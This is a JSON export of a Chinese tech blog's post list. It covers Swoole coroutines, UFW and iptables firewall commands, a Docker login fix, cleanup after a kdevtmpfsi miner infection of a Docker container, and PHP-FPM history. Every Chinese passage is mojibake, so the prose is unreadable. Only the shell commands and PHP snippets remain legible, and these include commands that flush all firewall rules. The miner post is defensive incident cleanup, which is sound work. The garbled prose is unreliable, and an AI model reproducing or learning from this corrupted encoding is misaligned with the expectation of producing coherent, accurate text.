echo $i . PHP_EOL; &#125;);&#125;;echo &quot;ok&quot;; é€šè¿‡ time å‘½ä»¤åˆ†åˆ«æŸ¥çœ‹è€—æ—¶æ—¶é•¿ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š ä¼ ç»ŸåŒæ­¥é˜»å¡ï¼šé‡åˆ° IOé˜»å¡ï¼Œç­‰å¾…ï¼Œå¯¼è‡´æ€§èƒ½æŸå¤± å•åç¨‹ï¼šå°½ç®¡ IOé˜»å¡å¼•å‘äº†åç¨‹è°ƒåº¦ï¼Œä½†æœ‰ä¸”åªæœ‰ä¸€ä¸ªåç¨‹ å¤šåç¨‹ï¼šé‡åˆ° IOé˜»å¡ æ—¶å‘ç”Ÿè°ƒåº¦ï¼ŒIOå°±ç»ªæ—¶æ¢å¤è¿è¡Œ å¤šä¸ªåç¨‹ç‰ˆ2.0ï¼ˆCPU å¯†é›†å‹ï¼‰ï¼š 12345678910&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; go(function () use ($i) &#123; sleep(1); &#x2F;&#x2F; Co::sleep(1); echo $i . PHP_EOL; &#125;);&#125;;echo &quot;ok&quot;; åªæ˜¯å°† Co::sleep() æ”¹æˆäº† sleep()ï¼Œä¼šå‘ç°æ€»è€—æ—¶æ—¶é•¿åˆå’Œä¼ ç»ŸåŒæ­¥é˜»å¡å·®ä¸å¤šäº†ï¼Œè¿™æ˜¯å› ä¸ºï¼š sleep() å¯ä»¥çœ‹åšæ˜¯ CPUå¯†é›†å‹ä»»åŠ¡, ä¸ä¼šå¼•èµ·åç¨‹çš„è°ƒåº¦ Co::sleep() æ¨¡æ‹Ÿçš„æ˜¯ IOå¯†é›†å‹ä»»åŠ¡, ä¼šå¼•å‘åç¨‹çš„è°ƒåº¦ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ, åç¨‹é€‚åˆ IOå¯†é›†å‹ çš„åº”ç”¨ï¼Œè€Œä¸é€‚åˆ CPU å¯†é›†å‹ä»»åŠ¡ã€‚ å‚è€ƒé“¾æ¥ swoole| swoole åç¨‹åˆä½“éªŒ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole å¸¸è§è¯¯åŒºåŠé—®é¢˜æ€»ç»“","slug":"swoole-common-mistakes-and-problems-summary","date":"2020-12-14T14:12:33.000Z","updated":"2020-12-14T14:13:55.331Z","comments":true,"path":"swoole-common-mistakes-and-problems-summary/","link":"","permalink":"https://www.0x2beace.com/swoole-common-mistakes-and-problems-summary/","excerpt":"éšç€å¯¹Swoole çš„é€æ­¥äº†è§£ï¼Œæ€»ç»“ä»¥ä¸‹å¯èƒ½ä¼šç¢°åˆ°çš„è¯¯åŒºï¼š","text":"éšç€å¯¹Swoole çš„é€æ­¥äº†è§£ï¼Œæ€»ç»“ä»¥ä¸‹å¯èƒ½ä¼šç¢°åˆ°çš„è¯¯åŒºï¼š Swoole æ˜¯å•çº¿ç¨‹ Swoole å¼‚æ­¥å›è°ƒæ¨¡å—ä»…å¯ç”¨äº CLI å‘½ä»¤è¡Œæ¨¡å¼ Swoole åªæœ‰åŒæ­¥é˜»å¡çš„å®¢æˆ·ç«¯æ‰å¯åœ¨ php-fpm ä¸­ä½¿ç”¨ Swoole é‡æ–°ç¼–è¯‘å®‰è£…ä¼šè‡ªåŠ¨è¦†ç›–æ‰ä¹‹å‰çš„ç‰ˆæœ¬ CPUå¯†é›†å‹ä»»åŠ¡ï¼ˆç§‘å­¦è®¡ç®—ç­‰ï¼‰, ä¸ä¼šå¼•èµ·åç¨‹çš„è°ƒåº¦; IOå¯†é›†å‹ä»»åŠ¡ï¼ˆç½‘ç»œè¯·æ±‚, æ–‡ä»¶è¯»å†™ç­‰ï¼‰, æ‰ä¼šå¼•å‘åç¨‹çš„è°ƒåº¦ enable_coroutine å¼€å¯åç¨‹æ”¯æŒä¹‹åï¼Œæ— éœ€ä½¿ç”¨ Co\\Run åˆ›å»ºåç¨‹ æ‰€æœ‰çš„åç¨‹å¿…é¡»åœ¨åç¨‹å®¹å™¨é‡Œé¢åˆ›å»ºï¼ŒSwoole ç¨‹åºå¯åŠ¨çš„æ—¶å€™å¤§éƒ¨åˆ†æƒ…å†µä¼šè‡ªåŠ¨åˆ›å»ºåç¨‹å®¹å™¨ Swoole\\Coroutine å‰ç¼€çš„ç±»åæ˜ å°„ä¸º Coã€‚ä½¿ç”¨ Co\\Run æ–¹æ³•åˆ›å»ºåç¨‹å®¹å™¨ï¼Œä½¿ç”¨ Coroutine::create æˆ– go æ–¹æ³•åˆ›å»ºåç¨‹ã€‚ å¸¸è§é—®é¢˜ï¼š ä»€ä¹ˆæ˜¯åç¨‹å®¹å™¨ï¼Ÿ æ˜¯å¦å¯ä»¥å…±ç”¨ 1 ä¸ª Redis æˆ– MySQL è¿æ¥ Call to undefined function Co\\Run()","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Linux ufw å¿«é€Ÿä¸Šæ‰‹","slug":"linux-ufw-quick-start","date":"2020-12-10T13:54:58.000Z","updated":"2020-12-14T14:15:37.375Z","comments":true,"path":"linux-ufw-quick-start/","link":"","permalink":"https://www.0x2beace.com/linux-ufw-quick-start/","excerpt":"ä¹‹å‰å·²ç»äº†è§£äº† iptables æ˜¯è®¾ç½®é˜²ç«å¢™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œä½†å¯¹äºåˆå­¦è€…è€Œè¨€ï¼Œå®ƒçš„ä¸Šæ‰‹æ›²çº¿å¤ªé™¡äº†ã€‚","text":"ä¹‹å‰å·²ç»äº†è§£äº† iptables æ˜¯è®¾ç½®é˜²ç«å¢™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œä½†å¯¹äºåˆå­¦è€…è€Œè¨€ï¼Œå®ƒçš„ä¸Šæ‰‹æ›²çº¿å¤ªé™¡äº†ã€‚ UFW ï¼ˆå³ç®€å•é˜²ç«å¢™ï¼‰ç›¸è¾ƒ iptablesï¼Œå¯¹äºåˆå­¦è€…è€Œè¨€ï¼Œåˆ™æ˜“äºä¸Šæ‰‹å¾—å¤šã€‚ UFW é»˜è®¤å®‰è£…åœ¨Ubuntuä¸Šã€‚å¦‚æœç”±äºæŸç§åŸå› å·²å°†å…¶å¸è½½ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š 1$ sudo apt install ufw å¼€å¯ IPV6 123$ sudo vim &#x2F;etc&#x2F;default&#x2F;ufwIPV6&#x3D;yes æŸ¥çœ‹UFWçŠ¶æ€Ubuntu é»˜è®¤æ²¡æœ‰å¼€å¯ UFWã€‚ 1$ sudo ufw status inactiveï¼šè¡¨ç¤ºé˜²ç«å¢™å…³é—­çŠ¶æ€ activeï¼šè¡¨ç¤ºé˜²ç«å¢™å¼€å¯çŠ¶æ€ å¼€å¯UFW123$ sudo ufw enableCommand may disrupt existing ssh connections. Proceed with operation (y|n)? yFirewall is active and enabled on system startup åˆæ¬¡å¼€å¯ UFW æ²¡æœ‰ä»»ä½•è§„åˆ™ï¼ˆå¦‚æœä¹‹å‰å·²ç»æ·»åŠ è¿‡UFW è§„åˆ™ï¼Œåˆ™è¿˜æ˜¯å­˜åœ¨çš„ï¼‰ï¼Œå¦‚éœ€æŸ¥çœ‹ä»¥å¼€å¯å“ªäº›è§„åˆ™ï¼ŒåŒæ ·ä½¿ç”¨ufw statuså‘½ä»¤ã€‚ å…³é—­UFW1$ sudo ufw disable é‡ç½®æ‰€æœ‰è§„åˆ™1$ sudo ufw reset å…è®¸æŒ‡å®šç«¯å£1$ sudo ufw allow http &#x2F;&#x2F; sudo ufw allow 80 æŒ‡å®šç‰¹å®š IPä½¿ç”¨UFWæ—¶ï¼Œè¿˜å¯ä»¥æŒ‡å®šIPåœ°å€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¦å…è®¸æ¥è‡ªç‰¹å®šIPåœ°å€çš„è¿æ¥ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw allow from &lt;ip_address&gt; è¿˜å¯ä»¥é€šè¿‡æ·»åŠ to any portç«¯å£å·æ¥æŒ‡å®šå…è®¸IPåœ°å€è¿æ¥çš„ç‰¹å®šç«¯å£ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¦å…è®¸ 203.0.113.4 è¿æ¥åˆ°ç«¯å£22ï¼ˆSSHï¼‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ sudo ufw allow from 203.0.113.4 to any port 22 ç¦æ­¢æŒ‡å®šç«¯å£1$ sudo ufw deny https &#x2F;&#x2F; sudo ufw deny 443 åˆ é™¤æŒ‡å®šè§„åˆ™æ­£å¼åˆ é™¤å…·ä½“è§„åˆ™ä¹‹å‰ï¼Œå…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å¯¹åº”ç¼–å·ï¼š 1$ sudo ufw status numbered åˆ é™¤æŒ‡å®šç¼–å·å¯¹åº”çš„è§„åˆ™ï¼š 1$ sudo ufw delete &lt;id&gt; æ£€æŸ¥UFWçŠ¶æ€å’Œè§„åˆ™1$ sudo ufw status verbose é‡æ–°è½½å…¥é…ç½®1$ sudo ufw reload æ³¨æ„äº‹é¡¹âš ï¸ï¼š ä¿®æ”¹äº†æŸæ¡è§„åˆ™ä¹‹åï¼Œéœ€è¦è®©UFW é‡æ–°åŠ è½½é…ç½®ï¼Œè®¾å®šè§„åˆ™æ‰ä¼šç”Ÿæ•ˆã€‚ è°¨æ…ç¦ç”¨ sshï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´è‡ªå·±ä¹Ÿè¿æ¥ä¸ä¸Šã€‚ åœ¨å¯ç”¨ UFW ä¹‹å‰ï¼Œæœ€å¥½æ£€æŸ¥æˆ–è€…é‡ç½®ä¸€ä¸‹è§„åˆ™ã€‚ å‚è€ƒé“¾æ¥ How To Set Up a Firewall with UFW on Ubuntu 18.04 åœ¨ Ubuntu ä¸­ç”¨ UFW é…ç½®é˜²ç«å¢™","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"UFW","slug":"UFW","permalink":"https://www.0x2beace.com/tags/UFW/"}]},{"title":"Linux iptables å¸¸ç”¨è§„åˆ™æ•´ç†","slug":"linux-iptables-common-rules-collation","date":"2020-12-09T13:19:00.000Z","updated":"2020-12-10T13:56:03.338Z","comments":true,"path":"linux-iptables-common-rules-collation/","link":"","permalink":"https://www.0x2beace.com/linux-iptables-common-rules-collation/","excerpt":"å› ä¸ºæ‰‹ä¸Šä¸€ç›´ç®¡ç†ç€ä¸¤å°å®ä½“æœºï¼ˆæœåŠ¡å™¨ï¼‰ï¼Œè€Œå®ä½“æœºçš„æ˜¯æ²¡æœ‰â€œè½¯é˜²â€è¿™ä¸ªæ¦‚å¿µçš„ï¼Œâ€œç¡¬é˜²â€è§„åˆ™åªèƒ½è‡ªå·±å»è®¾å®šã€‚","text":"å› ä¸ºæ‰‹ä¸Šä¸€ç›´ç®¡ç†ç€ä¸¤å°å®ä½“æœºï¼ˆæœåŠ¡å™¨ï¼‰ï¼Œè€Œå®ä½“æœºçš„æ˜¯æ²¡æœ‰â€œè½¯é˜²â€è¿™ä¸ªæ¦‚å¿µçš„ï¼Œâ€œç¡¬é˜²â€è§„åˆ™åªèƒ½è‡ªå·±å»è®¾å®šã€‚ è€ŒLinux åŸå§‹çš„é˜²ç«å¢™å·¥å…·iptables è¿‡äºç¹çï¼Œä¸Šæ‰‹æ›²çº¿è¾ƒé™¡ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°å°±ç”¨æ¥æ•´ç† Linux çš„ iptables ç›¸å…³çŸ¥è¯†ã€‚ iptables æ˜¯ä»€ä¹ˆæˆ‘ä»¬å¸¸å¸¸ä¼šå¬åˆ°è¿™æ ·çš„è¯´æ³•ï¼šâ€œiptables æ˜¯ä¸€ä¸ªé˜²ç«å¢™â€ï¼Œå…¶å®ä¸æ˜¯ï¼Œå®ƒä¹Ÿä¸æ˜¯ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨/åœæ­¢/é‡å¯ã€‚ 1systemctl start&#x2F;stop&#x2F;restart iptables iptables å…¶å®åªæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒç”¨æ¥æ“ä½œ netfilter å†…æ ¸é˜²ç«å¢™ï¼Œæ‰€ä»¥çœŸæ­£åº”ç”¨çš„é˜²ç«å¢™åº”è¯¥æ˜¯netfilterã€‚ å½“æ‹¿åˆ°ä¸€å°Linux åï¼Œiptableså°±åœ¨é‚£é‡Œï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒå…è®¸æ‰€æœ‰æµé‡ã€‚ 123456789$ sudo iptables -LChain INPUT (policy ACCEPT)target prot opt source destination Chain FORWARD (policy ACCEPT)target prot opt source destination Chain OUTPUT (policy ACCEPT)target prot opt source destination å…è®¸ç‰¹å®šç«¯å£è®¿é—®è®¿é—®è¿‡ç¨‹å¦‚ä¸‹ï¼š å°†æ­¤è§„åˆ™é™„åŠ åˆ°è¾“å…¥é“¾ï¼ˆ-A INPUTï¼‰ï¼Œä»¥ä¾¿æŸ¥çœ‹ä¼ å…¥æµé‡ æ£€æŸ¥æ˜¯å¦ä¸ºTCPï¼ˆ-p tcpï¼‰ å¦‚æœæ˜¯ï¼Œæ£€æŸ¥è¾“å…¥æ˜¯å¦è¿›å…¥ç«¯å£ï¼ˆâ€“dport sshï¼‰ å¦‚æœæ˜¯ï¼Œæ¥å—è¾“å…¥ï¼ˆ-j ACCEPTï¼‰ 1234iptables -A INPUT -p tcp --dport 22 -j ACCEPT # å…è®¸è®¿é—®22ç«¯å£iptables -A INPUT -p tcp --dport 80 -j ACCEPT # å…è®¸è®¿é—®80ç«¯å£iptables -A INPUT -p tcp --dport 443 -j ACCEPT # å…è®¸è®¿é—®443ç«¯å£iptables -A FORWARD -j REJECT # ç¦æ­¢å…¶ä»–æœªå…è®¸çš„è§„åˆ™è®¿é—® ç¦æ­¢ç‰¹å®šç«¯å£è®¿é—®1iptables -A INPUT -p tcp --dport 6379 -j DROP # ç¦æ­¢6379ç«¯å£ä¼ å…¥æµé‡ å¦‚æœæƒ³è¦å±è”½UDPæµé‡è€Œä¸æ˜¯TCPæµé‡ï¼Œåªéœ€å°†ä¸Šè¿°è§„åˆ™ä¸­çš„ tcp ä¿®æ”¹ä¸º udp å³å¯ã€‚ ç¦ç”¨é˜²ç«å¢™å¦‚æœéœ€è¦ä¸´æ—¶/æ°¸ä¹…ç¦ç”¨iptables é˜²ç«å¢™ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¸…é™¤æ‰€æœ‰è§„åˆ™ï¼š 1234sudo iptables -P INPUT ACCEPTsudo iptables -P OUTPUT ACCEPTsudo iptables -P FORWARD ACCEPTsudo iptables -F è®¾ç½®å®Œæˆä¹‹åï¼Œä¸ç”¨é‡å¯ä»»ä½•æœåŠ¡ï¼Œå…¶é˜²ç«å¢™è§„åˆ™å·²ç»åˆ·æ–°äº†ï¼ˆå…è®¸æ‰€æœ‰æµé‡ï¼‰ã€‚ å‚è€ƒé“¾æ¥ 25 ä¸ªæœ‰ç”¨çš„ iptables é˜²ç«å¢™è§„åˆ™ å¦‚ä½•åœ¨Ubuntuä¸Šå¯åŠ¨/åœæ­¢iptablesï¼Ÿ IptablesHowTo iptables - Linux","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"iptables","slug":"iptables","permalink":"https://www.0x2beace.com/tags/iptables/"}]},{"title":"Docker Login ç™»å½•å¼‚å¸¸","slug":"docker-Login-login-exception","date":"2020-12-06T14:51:20.000Z","updated":"2020-12-06T14:58:27.671Z","comments":true,"path":"docker-Login-login-exception/","link":"","permalink":"https://www.0x2beace.com/docker-Login-login-exception/","excerpt":"ä»Šå¤©åˆšå¥½æœ‰ç©ºï¼ŒæŠŠå‰å¤©é‚£ä¸ªè¢«æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„å®¹å™¨ç»™æ¢ä¸€æ¢ã€‚","text":"ä»Šå¤©åˆšå¥½æœ‰ç©ºï¼ŒæŠŠå‰å¤©é‚£ä¸ªè¢«æŒ–çŸ¿ç—…æ¯’æ„ŸæŸ“çš„å®¹å™¨ç»™æ¢ä¸€æ¢ã€‚ é—®é¢˜æè¿°ä½¿ç”¨ docker login ç™»å½•æ—¶ï¼Œæ€»æ˜¯ä¼šæç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼Œå¯æ˜¯æˆ‘æ˜æ˜è¾“å…¥çš„æ˜¯æ­£ç¡®çš„è´¦å·å¯†ç ã€‚ 1Error saving credentials: error storing credentials - err: exit status 1, out: Cannot autolaunch D-Bus without X11 $DISPLAY å› ä¸ºæˆ‘ä½¿ç”¨çš„å¹¶ä¸æ˜¯æœ€æ–°çš„ docker-ce ç‰ˆï¼Œè€Œæ˜¯è€ç‰ˆæœ¬docker.ioï¼Œæ‰€ä»¥èµ·åˆæˆ‘æ˜¯æ€€ç–‘ç‰ˆæœ¬å‡ºç°äº†ä¸å…¼å®¹çš„é—®é¢˜å—ï¼Ÿ å…¶å®ä¸æ˜¯ï¼Œè¿™æ˜¯åœ¨ Ubuntu ä¸‹ä½¿ç”¨ docker ç‰¹æœ‰çš„ bug ï¼Œè€Œä¿®å¤åŠæ³•ä¸éœ€è¦ç‰¹æ„å»å¸è½½ docker-compose ï¼Œåªè¦ â€œpassâ€ æ‰éªŒè¯æ­¥éª¤ã€‚ é—®é¢˜è§£å†³æœ€ç»ˆè§£å†³æ­¥éª¤å¦‚ä¸‹ï¼š 1. å®‰è£… gnupg2 å’Œ pass1sudo apt install gnupg2 pass 2. ç”Ÿæˆå¯†é’¥1$ gpg2 --full-generate-key 3. æŸ¥çœ‹å¯†é’¥æ‰€åœ¨è·¯å¾„1$ gpg2 -k 4. ä½¿ç”¨ pass åŠ è½½éªŒè¯1$ pass init &quot;your key location path&quot; è‡³æ­¤å°±å·²ç»pass æ‰äº†éªŒè¯æ­¥éª¤ï¼Œå¯ä»¥ä½¿ç”¨ docker login æ­£å¸¸ç™»å½•äº†ã€‚ å‚è€ƒé“¾æ¥ Docker login æŠ¥è¯ä¹¦å­˜å‚¨é”™è¯¯çš„è§£å†³åŠæ³•","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"è®°ä¸€æ¬¡æœåŠ¡å™¨è¢« kdevtmpfsi å˜çŸ¿æœº","slug":"remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi","date":"2020-12-03T14:04:11.000Z","updated":"2023-02-18T03:28:33.606Z","comments":true,"path":"remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/","link":"","permalink":"https://www.0x2beace.com/remember-once-the-server-was-changed-into-a-miner-by-kdevtmpfsi/","excerpt":"æ˜¨å¤©æœ‰å°æµ‹è¯•æœåŠ¡å™¨è¢«å‘ŠçŸ¥æœåŠ¡å¼‚å¸¸ï¼Œè¿›æœåŠ¡å™¨ä¹‹åæ‰å‘ç°æ˜¯å› ä¸ºdocker å¼‚å¸¸é€€å‡ºäº†ã€‚","text":"æ˜¨å¤©æœ‰å°æµ‹è¯•æœåŠ¡å™¨è¢«å‘ŠçŸ¥æœåŠ¡å¼‚å¸¸ï¼Œè¿›æœåŠ¡å™¨ä¹‹åæ‰å‘ç°æ˜¯å› ä¸ºdocker å¼‚å¸¸é€€å‡ºäº†ã€‚ å°†docker è¿è¡Œèµ·æ¥ä¹‹åï¼Œå‘ç°æœ‰ä¸ªä¸è®¤è¯†çš„è¿›ç¨‹ kdevtmpfsi å ç”¨CPU å¼‚å¸¸çš„å¤šï¼ŒGoogle ä¸€ä¸‹æ‰çŸ¥é“ï¼Œå¥½å®¶ä¼™ï¼ŒæœåŠ¡å™¨è¢«å½“æˆçŸ¿æœºäº†ã€‚ ç›´æ¥ kill å¹¶ä¸èƒ½å°†å…¶ç»“æŸæ‰ï¼Œå®ƒè¿˜æœ‰å®ˆæŠ¤è¿›ç¨‹åŠå¯èƒ½å­˜åœ¨çš„å®šæ—¶ä»»åŠ¡ã€‚ 1. é¦–å…ˆæŸ¥æ‰¾æ–‡ä»¶12$ find &#x2F; -name kinsing &#x2F;&#x2F; å®ˆæŠ¤è¿›ç¨‹$ find &#x2F; -name kdevtmpfsi &#x2F;&#x2F; æŒ–çŸ¿è¿›ç¨‹ å¦‚æœRedis æ˜¯è¿è¡Œåœ¨æœ¬åœ°ï¼Œä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶é€šå¸¸æ˜¯åœ¨/tmp/ç›®å½•ä¸‹ã€‚ å¦‚æœRedis æ˜¯ä»¥å®¹å™¨çš„æ–¹å¼è¿è¡Œï¼Œåˆ™é€šå¸¸æ˜¯åœ¨/var/lib/docker/overlay2/ï¼ˆå®¹å™¨çš„ /tmp/ ç›®å½•ï¼‰ä¸‹ã€‚ 2. å°†å…¶åˆ é™¤1$ rm -f kinsing kdevtmpfsi è¿™é‡Œè¢«æ„ŸæŸ“çš„å®¹å™¨ä¹Ÿä¸ä¸€å®šæ˜¯Redis ï¼Œæ¯”å¦‚æˆ‘çš„åˆ™æ˜¯PHPï¼Œæ‰€ä»¥éœ€è¦è¿›å…¥åˆ°è¢«æ„ŸæŸ“çš„å®¹å™¨å†…æ‰èƒ½æ‰¾åˆ°ã€‚ 3. å¹²æ‰è¿›ç¨‹123$ ps -aux | grep kinsing$ ps -aux | grep kdevtmpfsi$ kill -9 pid 4. æŸ¥çœ‹å®šæ—¶ä»»åŠ¡1$ crontab -l å­˜åœ¨å®šæ—¶ä»»åŠ¡çš„ä¸ä¸€å®šæ˜¯å½“å‰ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾å…¶ä»–ç”¨æˆ·æ˜¯å¦å­˜åœ¨ä»»åŠ¡ï¼š 1$ for user in $(cut -f1 -d: &#x2F;etc&#x2F;passwd); do crontab -u $user -l; done å®šæ—¶ä»»åŠ¡è¿˜å¯èƒ½å­˜åœ¨äºä»¥ä¸‹åœ°æ–¹ï¼š /etc/crontab /var/spool/cron/ /var/spool/cron/crontabs/ è‡³æ­¤å°±å®Œæˆäº†ç—…æ¯’çš„æ¸…ç†ï¼Œç½‘ä¸Šåƒç¯‡ä¸€å¾‹çš„å…¨æ˜¯è¿™ç§å¤„ç†æ–¹å¼ï¼Œä½†è¿™ä¸ªæ–¹å¼å¹¶ä¸é€‚åˆæˆ‘ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œæ— è®ºæˆ‘æ€ä¹ˆåˆ é™¤ï¼Œç—…æ¯’è¿˜æ˜¯å­˜åœ¨ã€‚ å› ä¸ºç—…æ¯’æ˜¯ä¾èµ–äºå®¹å™¨ç”Ÿå­˜çš„ï¼Œäºæ˜¯æˆ‘ä¾¿å°†å®¹å™¨åœæ­¢æ‰ï¼Œé€šè¿‡docker logs å®æ—¶æŸ¥çœ‹å®¹å™¨æœ€å10æ¡æ—¥å¿—ï¼š 1docker logs -f -t --tail 10 &lt;å®¹å™¨id&#x2F;å®¹å™¨åç§°&gt; ååˆ†é’Ÿä¹‹åï¼Œæ€»ç®—è®©æˆ‘é€®åˆ°äº†ï¼š è™½ç„¶ç›®ç¹äº†å…¨è¿‡ç¨‹ï¼Œä½†è¿™æ—¶æˆ‘ä¾ç„¶æ— èƒ½ä¸ºåŠ›ï¼Œå› ä¸ºæˆ‘ä¸çŸ¥é“ä¸Šé¢é‚£äº›å‘½ä»¤æ˜¯å¦‚ä½•è‡ªåŠ¨å¯åŠ¨çš„ã€‚ å°è¯•äº†å„ç§æ–¹å¼ï¼Œä½†éƒ½æ— è§£ï¼Œååˆ†é’Ÿä¹‹åç—…æ¯’è¿˜æ˜¯ä¼šå‡ºæ¥ï¼Œæœ€ç»ˆæˆ‘åªèƒ½æŠŠè¿™ä¸ªè¢«æ„ŸæŸ“çš„å®¹å™¨ç»™å¼ƒç”¨äº†ï¼Œé‡æ–°èµ·ä¸€ä¸ªæ–°çš„å®¹å™¨ã€‚ æ€»ç»“kdevtmpfsiç—…æ¯’çš„äº§ç”Ÿï¼Œé€šå¸¸æ˜¯å› ä¸ºRedis å¯¹å¤–å¼€æ”¾ 6379ç«¯å£ï¼Œä¸”æ²¡è®¾ç½®å¯†ç æˆ–è€…å¯†ç è¿‡äºç®€å•å¯¼è‡´ã€‚ æ‰€ä»¥æœåŠ¡å™¨ä¸€å®šè¦è®¾ç½®å¥½é˜²ç«å¢™ï¼Œåƒ3306ã€6379 è¿™ç§å¸¸ç”¨ç«¯å£ï¼Œå°½é‡å‡å°‘å¯¹å¤–å¼€æ”¾çš„æœºä¼šã€‚ å‚è€ƒé“¾æ¥ Linux.Packed.753","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"PHP-FPM è¿›åŒ–å²","slug":"the-evolution-of-php-fpm","date":"2020-12-02T13:42:16.000Z","updated":"2021-01-03T08:14:50.203Z","comments":true,"path":"the-evolution-of-php-fpm/","link":"","permalink":"https://www.0x2beace.com/the-evolution-of-php-fpm/","excerpt":"æœ€è¿‘æœ‰å¹¸è¯»åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä¸€æ–‡å°†CGI çš„è¿›åŒ–å²è®²çš„ç‰¹åˆ«è¯¦ç»†ï¼Œè™½ç„¶æˆ‘è‡ªå·±ä¹‹å‰ä¹Ÿæ•´ç†è¿‡ CGIã€FastCGIã€PHP-FPM ç›¸å…³çš„ç¬”è®°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»åŸç†çš„è§’åº¦æ¥è®¤è¯† CGIã€‚","text":"æœ€è¿‘æœ‰å¹¸è¯»åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä¸€æ–‡å°†CGI çš„è¿›åŒ–å²è®²çš„ç‰¹åˆ«è¯¦ç»†ï¼Œè™½ç„¶æˆ‘è‡ªå·±ä¹‹å‰ä¹Ÿæ•´ç†è¿‡ CGIã€FastCGIã€PHP-FPM ç›¸å…³çš„ç¬”è®°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»åŸç†çš„è§’åº¦æ¥è®¤è¯† CGIã€‚ CGI çš„è¯ç”Ÿæ—©äº›å¹´çš„Web åº”ç”¨å¾ˆç®€å•ï¼Œå®¢æˆ·ç«¯é€šè¿‡æµè§ˆå™¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ç›´æ¥è¿”å›å“åº”ã€‚ éšç€äº’è”ç½‘çš„å‘å±•ï¼Œç®€å•çš„Web åº”ç”¨å·²ç»ä¸èƒ½æ»¡è¶³å¼€å‘è€…ä»¬äº†ã€‚æˆ‘ä»¬å¸Œæœ›WebæœåŠ¡å™¨æœ‰æ›´å¤šçš„åŠŸèƒ½ï¼Œé£é€Ÿå‘å±•çš„åŒæ—¶è¿˜èƒ½è®©ä¸åŒè¯­è¨€çš„å¼€å‘è€…ä¹Ÿèƒ½åŠ å…¥ã€‚ CGIåè®®åè®®çš„è¯ç”Ÿå°±æ˜¯ WebæœåŠ¡å™¨å’Œå…¶ä»–é¢†åŸŸçš„å¼€å‘è€…åœ¨ä¿è¯éµå®ˆåè®®çš„åŸºç¡€ä¸Šï¼Œå‰©ä¸‹çš„å¯ä»¥è‡ªç”±å‘æŒ¥ï¼Œè€Œå®ç°è¿™ä¸ªåè®®çš„è„šæœ¬å«åšCGI ç¨‹åºã€‚ 